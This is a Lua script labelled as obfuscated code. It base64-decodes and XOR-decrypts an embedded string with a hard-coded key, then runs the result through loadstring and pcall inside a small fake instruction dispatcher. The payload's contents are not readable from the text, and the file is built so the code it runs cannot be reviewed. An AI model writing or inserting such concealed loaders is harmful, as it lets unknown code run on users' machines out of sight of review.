-- Ken's Obfuscated Code

local b64_0xll1II1 = {}
local char_0xI1I1I1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
for i_0xIIIIll=1,#char_0xI1I1I1 do b64_0xll1II1[char_0xI1I1I1:sub(i_0xIIIIll,i_0xIIIIll)] = i_0xIIIIll - 1 end

function b64_0xll1II1.dec_0x11I1II(d_0xIlllll)
    d_0xIlllll = string.gsub(d_0xIlllll, '[^'..char_0xI1I1I1..'=]', '')
    local r_0xIlllII = {}
    for i_0xIIIIll=1, #d_0xIlllll, 4 do
        local c_0xIlIllI = b64_0xll1II1[d_0xIlllll:sub(i_0xIIIIll,i_0xIIIIll)] or 0
        local c_0xlIIlII = b64_0xll1II1[d_0xIlllll:sub(i_0xIIIIll+1,i_0xIIIIll+1)] or 0
        
        local c_0xIlI1Il, c_0xlIIlIl = 0, 0
        local has3 = true
        local has4 = true

        local ch3 = d_0xIlllll:sub(i_0xIIIIll+2,i_0xIIIIll+2)
        if ch3 == "=" then has3 = false else c_0xIlI1Il = b64_0xll1II1[ch3] or 0 end

        local ch4 = d_0xIlllll:sub(i_0xIIIIll+3,i_0xIIIIll+3)
        if ch4 == "=" then has4 = false else c_0xlIIlIl = b64_0xll1II1[ch4] or 0 end
        
        local b_0x11lIII = c_0xIlIllI * (2^18) + c_0xlIIlII * (2^12) + c_0xIlI1Il * (2^6) + c_0xlIIlIl
        
        local b_0xll1II1 = math.floor(b_0x11lIII / (2^16)) % (2^8)
        local b_0xl1lIll = math.floor(b_0x11lIII / (2^8)) % (2^8)
        local b_0xIllIlI = b_0x11lIII % (2^8)
        
        table.insert(r_0xIlllII, string.char(b_0xll1II1))
        if has3 then table.insert(r_0xIlllII, string.char(b_0xl1lIll)) end
        if has4 then table.insert(r_0xIlllII, string.char(b_0xIllIlI)) end
    end
    return table.concat(r_0xIlllII)
end


local function bxor_0xlIlllI(a_0xllIl1l,b_0xIl1llI)
    if bit32 then return bit32.bxor(a_0xllIl1l,b_0xIl1llI) end
    local r_0xlIIIIl = 0
    for i_0x1I1II1 = 0, 7 do
        local x_0xIIl111 = a_0xllIl1l % 2
        local y_0xlIllII = b_0xIl1llI % 2
        if x_0xIIl111 ~= y_0xlIllII then r_0xlIIIIl = r_0xlIIIIl + (2^i_0x1I1II1) end
        a_0xllIl1l = math.floor(a_0xllIl1l / 2)
        b_0xIl1llI = math.floor(b_0xIl1llI / 2)
    end
    return r_0xlIIIIl
end


local function dec_0xllll11(s_0xlllI11, k_0xIlI1II)
    local r_0x1IIllI = {}
    for i_0x1llll1=1, #s_0xlllI11 do
        local b_0xlI11II = string.byte(s_0xlllI11, i_0x1llll1)
        local kb_0xIlIlll = string.byte(k_0xIlI1II, (i_0x1llll1-1) % #k_0xIlI1II + 1)
        r_0x1IIllI[i_0x1llll1] = string.char(bxor_0xlIlllI(b_0xlI11II, kb_0xIlIlll))
    end
    return table.concat(r_0x1IIllI)
end


local d_0xllIIII = {
  {op=255, val="IiIbMh5VCE08Px09BiUHWS0oMTdSSEtfLyAdfSIZClsrBBxZHhoIWSJtGyYABw5WOhgWOgQQGUsrBBxzT1UMWSMoVhQTGA5xKkcUPBEUBxgeIRkqFwcYGHNtHzIfEFF/KzkrNgADAlsrZVoDHhQSXTw+Wnp4GQRbLyFYPx0WClQeIRkqFwdLBW4dFDILEBlLYAEXMBMZO1QvNB0hUlhGGK7107PK1ouA+a3A/pLM6Nj2x5jq+1UMWSMoVhkdFyJcbq3B0JLN8tj215jrwJXTv671+bPK1ouA3a3A5lKV0rmu9e2zy/2LgNWtwNKSzf7Y9vlYBhwcHV08Ph0aFlWLgMqtwOSSzcYYKSwVNlwyClUrBBxZeFhGGK70+LPK9IuBya3AyZLN9Nj2/Jjr9ZXTua709LPK/4uA/63AypLM6tj275jr85XSvK7137PL/IuBzq3AzZLN3Nj3xZjr35XSu67107PL/IuBzq3A8JLN3tj275jr85XTs6708bPKxouByq3Ax5LM4tj2ypjq+pXTiq712nNaldK8rvXZs8v9i4HOrcDIks3O2Pb6mOvfldO/rvXis8rWi4DtrcDEks3a2PbZUVkeGghZIm0eJhwWH1EhI1ghBxs4XS98UHp4VUsYbj0KOhwBQxocOBY9GxsMAm4eHTJSREsQCigeMgcZHxghP1gAAhAIUSgkG3pQXGEYbm1YPx0UD0s6PxE9FV0MWSMoQhsGARt/KzlQcRoBH0g9d1d8ABQcFikkDDsHFx5LKz8bPBwBDlY6Yxs8H1ogXSAuEDpBWjhZJyEXIV8FAl0tKFchFxMYFyYoGTcBWgZZJyNXGB4UIE03AR04XBkeWWxkUXtbfw5WKkdyPx0WClRuKw09EQECVyBtCiYcJg5ZfGVRWVJVSxg+PxE9Bl1JajsjFjocElEYHSgZc0BXQjJubVhzHhoKXD05CjocEkNfLyAdaToBH0gJKAx7UB0fTD4+QnxdBwpPYCoRJxoACU09KAowHRsfXSA5VjAdGERzKyMbOxtGRGsvJBQ8AFgbUSsuHXwAEA1LYSUdMhYGRFUvJBZ8ORkKUzs0FDYZJg5ZfGMUJhNXQhFmZHI2HBFhMmNgWLPK1ouA/K3A8ZLN6tj2/5jr0VU7VC8uHRoWVYuBzq3A2pLN9dj2/5jrwpXSuK718LPKx4uA/q3A25LN7DIiIhsyHlUbVC8uHQARBwJIOj5YblIOYRhubVgIRUJcDHl7TWtAQFoKfXslc09VGU0gHh0yQ1lhGG5tWAhDRlsJeHpKZUVMXgp/dEEOUkhLSjsjKzYTR2FFREdVflJERRiu9e2zytaLgOmtwNuSzcHY9uCY6+iV07Cu9cqzyvRLaCIsGzY7EUvY9syY6vqV05Wu9eFZGxNLSCIsGzYhFhlRPjkLCBEAGUorIwwDHhQIXQcpJXMGHQ5WRG1Yc1IFB1ktKCswABwbTD0WGyYABw5WOh0UMhEQIlwTZVFZUlVLGERgVXNAW0vY9tuY6vuV04qu9PyzytSLgcatwdOSzePY9uBYAx4UCF0HKVizy/SLgNutwdtSMgpVKwQcc1ogBVE4KAogFzwPEW6twMaSzcjY9sqY6/OV04mu9eKzyuKLgPutwduSzerY9v6Y69mV06Gu9exZFxkYXScrWDAHBxldIDktPRsDDko9KDE3UkhWGHd8QGVFRFIJeHlYJxoQBTJubVhzAgcCVjplWgAXFFoaZ0dYc1JVGU0gHh0yQ11CMkQoFCAXf0sYbm1VflKV07mu9duzyuaLgPutwdeSzcrY98WY6vKV07qu9PGzyseLgc6twNSSzdzY98WY69+V06Gu9PyzyveLgOOtwOOSzO/Y9u6Y6vKV052u9dpZUlVLGCIiGzIeJQdZNygKaTkcCFNmbyswAAcCSDptNjwGVThNPj0XIQZXQjIrIxw=", is_enc=true},
}
local pc_0xIIlI1l = 1
local stk_0xIllI1I = {}


local disp_0x1IlIlI = {
    [0xA1] = function(s, v) table.insert(s, v) end, 
    [0xA2] = function(s, v) table.insert(s, tonumber(v)) end, 
    [0xB0] = function(s, n) 
        local f = table.remove(s) 
        if type(f) == "function" then f() 
        elseif type(f) == "string" then 
            local g = getfenv(2) or _G
            if g[f] then g[f](table.remove(s)) 
            else print("[LBI Error] Unknown function: " .. tostring(f)) end
        end 
    end,
    [0xFF] = function(s, v) 
        local fn, err = loadstring(v)
        if not fn then
            print("[LBI Error] Script Load Failed: " .. tostring(err))
        else
            local success, run_err = pcall(fn)
            if not success then
                print("[LBI Error] Script Runtime Failed: " .. tostring(run_err))
            end
        end
    end
}


while pc_0xIIlI1l <= #d_0xllIIII do
    local inst = d_0xllIIII[pc_0xIIlI1l]
    local opcode = inst.op
    local val = inst.val
    
    if inst.is_enc then
        val = dec_0xllll11(b64_0xll1II1.dec_0x11I1II(val), "NMxSruk8")
    end
    
    local handler = disp_0x1IlIlI[opcode]
    if handler then
        handler(stk_0xIllI1I, val)
    end
    
    pc_0xIIlI1l = pc_0xIIlI1l + 1
end
